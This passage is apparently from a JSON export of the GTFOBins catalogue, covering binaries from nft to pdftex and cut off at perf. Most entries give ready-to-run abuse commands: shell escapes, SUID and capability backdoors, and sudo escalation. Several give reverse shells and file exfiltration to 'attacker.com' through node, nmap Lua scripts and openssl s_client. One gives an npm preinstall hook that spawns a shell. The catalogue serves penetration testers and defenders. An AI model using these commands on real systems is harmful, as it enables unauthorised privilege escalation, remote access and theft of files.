        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nnft -f \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nft) .\n\nLFILE=file_to_read\n./nft -f \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo nft -f \"$LFILE\""
      }
    ]
  },
  {
    "id": 182,
    "bin": "nice",
    "url": "/gtfobins/nice/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnice /bin/sh\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nice) .\n\n./nice /bin/sh -p\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo nice /bin/sh"
      }
    ]
  },
  {
    "id": 183,
    "bin": "nl",
    "url": "/gtfobins/nl/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nnl -bn -w1 -s '' $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nl) .\n\nLFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE"
      }
    ]
  },
  {
    "id": 184,
    "bin": "nm",
    "url": "/gtfobins/nm/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nnm @$LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nm) .\n\nLFILE=file_to_read\n./nm @$LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo nm @$LFILE"
      }
    ]
  },
  {
    "id": 185,
    "bin": "nmap",
    "url": "/gtfobins/nmap/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nInput echo is disabled.\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nnmap --script=$TF\n\n\nThe interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.\nnmap --interactive\nnmap> !sh\n\n"
      },
      {
        "func": "Non-interactive reverse shell",
        "man": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp)\necho 'local s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nwhile true do\n  local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));t:send(b);\nend;\nf:close();t:close();' > $TF\nnmap --script=$TF\n\n"
      },
      {
        "func": "Non-interactive bind shell",
        "man": "It can bind a non-interactive shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell.\nexport LPORT=12345\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nwhile true do\n  local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n  local b=assert(f:read(\"*a\"));c:send(b);\nend;c:close();f:close();' > $TF\nnmap --script=$TF\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080.\nRHOST=attacker.com\nRPORT=8080\nLFILE=file_to_send\nnmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE\n\n\nSend a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file.\nexport RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nTF=$(mktemp)\necho 'local f=io.open(os.getenv(\"LFILE\"), 'rb')\nlocal d=f:read(\"*a\")\nio.close(f);\nlocal s=require(\"socket\");\nlocal t=assert(s.tcp());\nt:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\nt:send(d);\nt:close();' > $TF\nnmap --script=$TF\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., php -S 0.0.0.0:8080. Note that multiple connections are made to the server and the result is placed in $TF/IP/PORT/PATH. Also, it is important that the port is a commonly used HTTP like 80 or 8080.\nRHOST=attacker.com\nRPORT=8080\nTF=$(mktemp -d)\nLFILE=file_to_save\nnmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE\n\n\nFetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file.\nexport LPORT=12345\nexport LFILE=file_to_save\nTF=$(mktemp)\necho 'local k=require(\"socket\");\nlocal s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\nlocal c=s:accept();\nlocal d,x=c:receive(\"*a\");\nc:close();\nlocal f=io.open(os.getenv(\"LFILE\"), \"wb\");\nf:write(d);\nio.close(f);' > $TF\nnmap --script=$TF\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nTF=$(mktemp)\necho 'local f=io.open(\"file_to_write\", \"wb\"); f:write(\"data\"); io.close(f);' > $TF\nnmap --script=$TF\n\n\nThe payload appears inside the regular nmap output.\nLFILE=file_to_write\nnmap -oG=$LFILE DATA\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nTF=$(mktemp)\necho 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);' > $TF\nnmap --script=$TF\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nThe payload appears inside the regular nmap output.\nsudo install -m =xs $(which nmap) .\n\nLFILE=file_to_write\n./nmap -oG=$LFILE DATA\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nInput echo is disabled.\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n\n\nThe interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.\nsudo nmap --interactive\nnmap> !sh\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nInput echo is disabled.\nsudo install -m =xs $(which nmap) .\n\nTF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\n./nmap --script=$TF"
      }
    ]
  },
  {
    "id": 186,
    "bin": "node",
    "url": "/gtfobins/node/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnode -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n\n"
      },
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nRun nc -l -p 12345 on the attacker box to receive the shell.\nexport RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'\n\n"
      },
      {
        "func": "Bind shell",
        "man": "It can bind a shell to a local port to allow remote network access.\n\n\nRun nc target.com 12345 on the attacker box to connect to the shell.\nexport LPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(process.env.LPORT)'\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nSend a local file via HTTP POST request.\nexport URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nFetch a remote file via HTTP GET request.\nexport URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nnode -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nnode -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which node) .\n\n./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n\n"
      },
      {
        "func": "Capabilities",
        "man": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.\n\n\ncp $(which node) .\nsudo setcap cap_setuid+ep node\n\n./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
      }
    ]
  },
  {
    "id": 187,
    "bin": "nohup",
    "url": "/gtfobins/nohup/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\"\n\n"
      },
      {
        "func": "Command",
        "man": "It can be used to break out from restricted environments by running non-interactive system commands.\n\n\nCOMMAND='/usr/bin/id'\nnohup \"$COMMAND\"\ncat nohup.out\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which nohup) .\n\n./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
      }
    ]
  },
  {
    "id": 188,
    "bin": "npm",
    "url": "/gtfobins/npm/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnpm exec /bin/sh\n\n\nAdditionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., npm -C $TF run preinstall.\nTF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nAdditionally, arbitrary script names can be used in place of preinstall and triggered by name with, e.g., npm -C $TF run preinstall.\nTF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i"
      }
    ]
  },
  {
    "id": 189,
    "bin": "nroff",
    "url": "/gtfobins/nroff/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is typeset and some warning messages may appear.\nLFILE=file_to_read\nnroff $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff"
      }
    ]
  },
  {
    "id": 190,
    "bin": "nsenter",
    "url": "/gtfobins/nsenter/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nnsenter /bin/sh\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo nsenter /bin/sh"
      }
    ]
  },
  {
    "id": 191,
    "bin": "octave",
    "url": "/gtfobins/octave/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\noctave-cli --eval 'system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\noctave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\noctave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo octave-cli --eval 'system(\"/bin/sh\")'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which octave) .\n\n./octave-cli --eval 'system(\"/bin/sh\")'"
      }
    ]
  },
  {
    "id": 192,
    "bin": "od",
    "url": "/gtfobins/od/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which od) .\n\nLFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\""
      }
    ]
  },
  {
    "id": 193,
    "bin": "openssl",
    "url": "/gtfobins/openssl/",
    "funcs": [
      {
        "func": "Reverse shell",
        "man": "It can send back a reverse shell to a listening attacker to open a remote network access.\n\n\nTo receive the shell run the following on the attacker box:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n\n"
      },
      {
        "func": "File upload",
        "man": "It can exfiltrate files on the network.\n\n\nTo collect the file run the following on the attacker box:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\nSend a local file via TCP. Transmission will be encrypted.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\"\n\n"
      },
      {
        "func": "File download",
        "man": "It can download remote files.\n\n\nTo send the file run the following on the attacker box:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\nFetch a file from a TCP port, transmission will be encrypted.\nRHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\"\n\n"
      },
      {
        "func": "File write",
        "man": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.\n\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\"\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\nopenssl enc -in \"$LFILE\"\n\n"
      },
      {
        "func": "Library load",
        "man": "It loads shared libraries that may be used to run code in the binary execution context.\n\n\nopenssl req -engine ./lib.so\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nTo receive the shell run the following on the attacker box:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\nsudo install -m =xs $(which openssl) .\n\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n\n\nsudo install -m =xs $(which openssl) .\n\nLFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTo receive the shell run the following on the attacker box:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\nRHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s"
      }
    ]
  },
  {
    "id": 194,
    "bin": "openvpn",
    "url": "/gtfobins/openvpn/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nopenvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe file is actually parsed and the first partial wrong line is returned in an error message.\nLFILE=file_to_read\nopenvpn --config \"$LFILE\"\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which openvpn) .\n\n./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n\n\nThe file is actually parsed and the first partial wrong line is returned in an error message.\nsudo install -m =xs $(which openvpn) .\n\nLFILE=file_to_read\n./openvpn --config \"$LFILE\"\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n\n\nThe file is actually parsed and the first partial wrong line is returned in an error message.\nLFILE=file_to_read\nsudo openvpn --config \"$LFILE\""
      }
    ]
  },
  {
    "id": 195,
    "bin": "openvt",
    "url": "/gtfobins/openvt/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.\nCOMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF"
      }
    ]
  },
  {
    "id": 196,
    "bin": "opkg",
    "url": "/gtfobins/opkg/",
    "funcs": [
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nIt runs an interactive shell using a specially crafted Debian package. Generate it with fpm and upload it to the target.\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\nsudo opkg install x_1.0_all.deb"
      }
    ]
  },
  {
    "id": 197,
    "bin": "paste",
    "url": "/gtfobins/paste/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nLFILE=file_to_read\npaste $LFILE\n\n"
      },
      {
        "func": "SUID",
        "man": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which paste) .\n\nLFILE=file_to_read\npaste $LFILE\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nLFILE=file_to_read\nsudo paste $LFILE"
      }
    ]
  },
  {
    "id": 198,
    "bin": "pax",
    "url": "/gtfobins/pax/",
    "funcs": [
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe output is a tar archive containing the read file as it is, hence this may not be suitable to read arbitrary binary files.\nLFILE=file_to_read\npax -w \"$LFILE\""
      }
    ]
  },
  {
    "id": 199,
    "bin": "pdb",
    "url": "/gtfobins/pdb/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\nTF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nTF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont"
      }
    ]
  },
  {
    "id": 200,
    "bin": "pdflatex",
    "url": "/gtfobins/pdflatex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "File read",
        "man": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.\n\n\nThe read file will be part of the output.\npdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nThe read file will be part of the output.\nsudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n\n\nsudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pdflatex) .\n\n./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
      }
    ]
  },
  {
    "id": 201,
    "bin": "pdftex",
    "url": "/gtfobins/pdftex/",
    "funcs": [
      {
        "func": "Shell",
        "man": "It can be used to break out from restricted environments by spawning an interactive system shell.\n\n\npdftex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Sudo",
        "man": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.\n\n\nsudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n\n"
      },
      {
        "func": "Limited SUID",
        "man": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n\n\nsudo install -m =xs $(which pdftex) .\n\n./pdftex --shell-escape '\\write18{/bin/sh}\\end'"
      }
    ]
  },
  {
    "id": 202,
    "bin": "perf",
    "url": "/gtfobins/perf/",
    "funcs": [
      {
